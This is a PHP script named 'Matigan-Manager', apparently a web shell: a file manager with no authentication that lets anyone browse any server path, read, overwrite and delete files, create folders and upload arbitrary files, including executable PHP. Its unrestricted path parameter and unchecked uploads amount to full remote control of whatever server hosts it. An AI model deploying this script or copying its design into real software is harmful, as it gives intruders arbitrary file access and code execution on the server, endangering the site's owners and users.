<?php
function secure_input($input) {
    return htmlspecialchars($input, ENT_QUOTES);
}

function list_directory($path) {
    $contents = scandir($path);
    $folders = [];
    $files = [];

    foreach ($contents as $item) {
        if ($item == '.' || $item == '..') continue;
        $full_path = $path . '/' . $item;
        if (is_dir($full_path)) {
            $folders[] = '<li><strong>Folder:</strong> <a href="?path=' . htmlspecialchars(urlencode($full_path), ENT_QUOTES) . '">' . htmlspecialchars($item, ENT_QUOTES) . '</a></li>';
        } else {
            $file_size = filesize($full_path);
            $file_size_formatted = format_file_size($file_size);
            $files[] = '<li><strong>File:</strong> <a href="?action=edit&file=' . urlencode($item) . '&path=' . urlencode($path) . '">' . htmlspecialchars($item, ENT_QUOTES) . '</a> (' . htmlspecialchars($file_size_formatted, ENT_QUOTES) . ') - <a href="?action=delete&file=' . urlencode($item) . '&path=' . urlencode($path) . '">Delete</a></li>';
        }
    }

    echo '<ul>';
    echo implode('', $folders);
    if (!empty($folders) && !empty($files)) {
        echo '<hr>';
    }
    echo implode('', $files);
    echo '</ul>';
}

function format_file_size($file_size) {
    if ($file_size == 0) {
        return '0 B';
    }
    
    $size_unit = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
    $i = floor(log($file_size, 1024));
    return round($file_size / pow(1024, $i), 2) . ' ' . htmlspecialchars($size_unit[$i], ENT_QUOTES);
}

function create_new_folder($path, $folder_name) {
    $folder_name = secure_input($folder_name);
    $folder_name = basename($folder_name);
    $new_folder_path = $path . '/' . $folder_name;
    if (!file_exists($new_folder_path)) {
        mkdir($new_folder_path);
        echo "Folder '$folder_name' successfully created!";
    } else {
        echo "Folder '$folder_name' already exists!";
    }
}

function upload_new_file($path, $file_to_upload) {
    $target_directory = $path . '/';
    $target_file = $target_directory . basename($file_to_upload['name']);
    $upload_ok = 1;

    if (move_uploaded_file($file_to_upload['tmp_name'], $target_file)) {
        echo "File " . htmlspecialchars(basename($file_to_upload['name']), ENT_QUOTES) . " successfully uploaded.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}

function edit_file_content($file_path) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $content = $_POST['file_content'];
        if (file_put_contents($file_path, $content) !== false) {
            echo "File saved successfully.";
        } else {
            echo "An error occurred while saving the file.";
        }
    }
    $content = file_get_contents($file_path);
    echo '<form method="post">';
    echo '<textarea name="file_content" rows="10" cols="50">' . htmlspecialchars($content, ENT_QUOTES) . '</textarea><br>';
    echo '<input type="submit" value="Save">';
    echo '</form>';
}

function delete_file($file_path) {
    if (file_exists($file_path)) {
        if (unlink($file_path)) {
            echo "File successfully deleted.";
        } else {
            echo "Unable to delete file.";
        }
    } else {
        echo "File not found.";
    }
}

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();

$path_parts = explode('/', $path);
$breadcrumbs = [];
$breadcrumbs[] = '<a href="?path=/' . '">Root</a>'; 

foreach ($path_parts as $index => $part) {
    if (!empty($part)) {
        $dir_path = implode('/', array_slice($path_parts, 0, $index + 1));
        $breadcrumbs[] = '<a href="?path=' . htmlspecialchars(urlencode($dir_path), ENT_QUOTES) . '">' . htmlspecialchars($part, ENT_QUOTES) . '</a>';
    }
}

echo '<div>';
echo implode(' / ', $breadcrumbs);
echo '</div>';

if (isset($_GET['action'])) {
    $action = $_GET['action'];
    switch ($action) {
        case 'edit':
            if (isset($_GET['file'])) {
                $file = $_GET['file'];
                $file_path = $path . '/' . $file;
                if (file_exists($file_path)) {
                    echo '<h2>Edit File: ' . htmlspecialchars($file, ENT_QUOTES) . '</h2>';
                    edit_file_content($file_path);
                } else {
                    echo "File not found.";
                }
            } else {
                echo "Invalid file.";
            }
            break;
        case 'delete':
            if (isset($_GET['file'])) {
                $file = $_GET['file'];
                $file_path = $path . '/' . $file;
                delete_file($file_path);
            } else {
                echo "Invalid file.";
            }
            break;
        default:
            echo "Invalid action.";
    }
} else {
    echo "<h2>Directory: " . htmlspecialchars($path, ENT_QUOTES) . "</h2>";
    echo "<h2>Matigan-Manager</h2>";
    echo "<p>" . list_directory($path) . "</p>";
    echo '<hr>';
    echo '<h3>Create New Folder:</h3>';
    echo '<form action="" method="post">';
    echo 'New Folder Name: <input type="text" name="folder_name">';
    echo '<input type="submit" name="create_folder" value="Create Folder">';
    echo '</form>';
    echo '<h3>Upload New File:</h3>';
    echo '<form action="" method="post" enctype="multipart/form-data">';
    echo 'Select file to upload: <input type="file" name="file_to_upload">';
    echo '<input type="submit" name="upload_file" value="Upload File">';
    echo '</form>';
}

if (isset($_POST['create_folder'])) {
    create_new_folder($path, $_POST['folder_name']);
}

if (isset($_POST['upload_file'])) {
    upload_new_file($path, $_FILES['file_to_upload']);
}
?>
